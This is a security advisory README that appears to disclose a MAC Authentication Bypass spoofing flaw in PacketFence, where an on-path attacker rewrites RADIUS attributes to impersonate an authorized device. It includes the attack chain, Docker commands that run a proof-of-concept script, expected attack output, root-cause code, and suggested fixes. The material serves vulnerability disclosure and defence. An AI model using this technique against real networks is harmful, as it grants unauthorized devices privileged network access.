# PacketFence MAB Device Spoofing via Calling-Station-Id Tampering

## Overview

PacketFence identifies devices in MAB (MAC Authentication Bypass) authentication by reading `Calling-Station-Id` directly from the RADIUS `Access-Request` packet (`lib/pf/Switch.pm`, `parseRequest()` method). This MAC address is used as the device identity for node lookup, VLAN assignment, role assignment, and locationlog tracking.

RFC 2865 provides **no integrity protection** for attributes in `Access-Request` — the Request Authenticator is a random nonce, not a MAC. An on-path (MITM) attacker can replace `Calling-Station-Id` with an authorized device's MAC address, causing PacketFence to authenticate the unauthorized device as the authorized one.

**Result**: An unauthorized device receives the authorized device's VLAN, role, and ACL. The NAS validates the Response Authenticator successfully — the attack is undetectable.

## Affected Software

- **PacketFence** (all versions using MAB authentication)
- Source: [`lib/pf/Switch.pm`](https://github.com/inverse-inc/packetfence/blob/devel/lib/pf/Switch.pm) `parseRequest()`, [`lib/pf/radius.pm`](https://github.com/inverse-inc/packetfence/blob/devel/lib/pf/radius.pm)

## Attack Chain

```
1. Unauthorized device connects to switch port (MAB enabled)
2. Switch sends Access-Request:
   - Calling-Station-Id = real MAC (unauthorized)
   - User-Name = real MAC
   - User-Password = real MAC (encrypted)
3. On-path attacker intercepts, replaces:
   - Calling-Station-Id → authorized printer MAC
   - User-Name → authorized printer MAC
   - User-Password → re-encoded for authorized MAC
4. PacketFence: parseRequest() extracts spoofed MAC → node lookup succeeds
5. Access-Accept with corporate VLAN 10 returned
6. Response Authenticator valid ✓
7. NAS applies corporate VLAN to unauthorized device
```

## Comparison with CVE-2024-3596 (Blast-RADIUS)

| | CVE-2024-3596 (Blast-RADIUS) | This issue |
|---|---|---|
| Attack model | On-path MITM | On-path MITM (same) |
| MD5 collision required | Yes | **No** |
| Shared secret required | No | **Yes** (for User-Password re-encoding) |
| Complexity | High | **Medium** |
| Impact | Forge Access-Accept/Reject | Device impersonation |

> Note: In MAB, the shared secret is often known or guessable since MAB is considered a low-security mechanism. Many deployments use default or weak shared secrets.

## Reproduce

### Prerequisites

- Docker & Docker Compose

### Steps

```bash
git clone https://github.com/APEvul-cyber/packetfence-mab-spoofing.git
cd packetfence-mab-spoofing
docker compose up -d --build
sleep 5
docker compose exec attacker python /scripts/poc_mab_spoofing.py
```

### Expected Output

```
STEP 1: Baseline — Unauthorized device MAB (no MITM)
  Device MAC: deadbeef1234
  Server response: Access-Reject

STEP 2: Verify — Authorized printer MAB (no MITM)
  Device MAC: aabbccddeeff
  Server response: Access-Accept
  VLAN: 10

STEP 3: Attack — MITM spoofs Calling-Station-Id
  Real device MAC: deadbeef1234
  MITM changes to: aabbccddeeff
  Server response: Access-Accept
  VLAN: 10

✓ ATTACK SUCCESSFUL — MAB DEVICE SPOOFING CONFIRMED
```

## Root Cause (Source Code)

**`lib/pf/Switch.pm` — `parseRequest()`:**

```perl
sub parseRequest {
    my ( $self, $radius_request ) = @_;
    my $client_mac = ref($radius_request->{'Calling-Station-Id'}) eq 'ARRAY'
        ? clean_mac($radius_request->{'Calling-Station-Id'}[0])
        : clean_mac($radius_request->{'Calling-Station-Id'});
    # ... no validation against actual connecting device
    return ($nas_port_type, $eap_type, $client_mac, $port, ...);
}
```

The extracted `$client_mac` is then used throughout PacketFence for:
- Node database lookup (`pf::dal::node->find_or_create`)
- VLAN/role assignment
- locationlog tracking (`pf::locationlog`)
- Fingerbank device profiling

## Suggested Fix

1. **Require 802.1X for sensitive VLANs** — MAB is inherently weaker than 802.1X. Devices on critical VLANs should use 802.1X with certificates.
2. **Require `Message-Authenticator`** (RFC 2869) on all `Access-Request` packets to prevent attribute tampering.
3. **Cross-validate MAC** against switch port security tables or SNMP data when available.
4. **Document the risk** — MAB deployments using RADIUS/UDP without RadSec are vulnerable to device impersonation.

## References

- [CVE-2024-3596 — Blast-RADIUS](https://www.blastradius.fail/)
- [RFC 2865 — RADIUS](https://datatracker.ietf.org/doc/html/rfc2865)
- [RFC 6614 — RadSec](https://datatracker.ietf.org/doc/html/rfc6614)
- PacketFence: [`lib/pf/Switch.pm`](https://github.com/inverse-inc/packetfence/blob/devel/lib/pf/Switch.pm), [`lib/pf/radius.pm`](https://github.com/inverse-inc/packetfence/blob/devel/lib/pf/radius.pm)

## Project Structure

```
├── docker-compose.yml
├── freeradius/
│   ├── Dockerfile
│   └── raddb/
│       ├── clients.conf
│       ├── sites-enabled/default    # MAB VLAN policy
│       └── mods-config/files/authorize
├── attacker/
│   ├── Dockerfile
│   └── scripts/
│       ├── radius_utils.py
│       ├── mitm_proxy.py
│       └── poc_mab_spoofing.py      # End-to-end PoC
└── README.md
```

## License

This project is for security research purposes only.
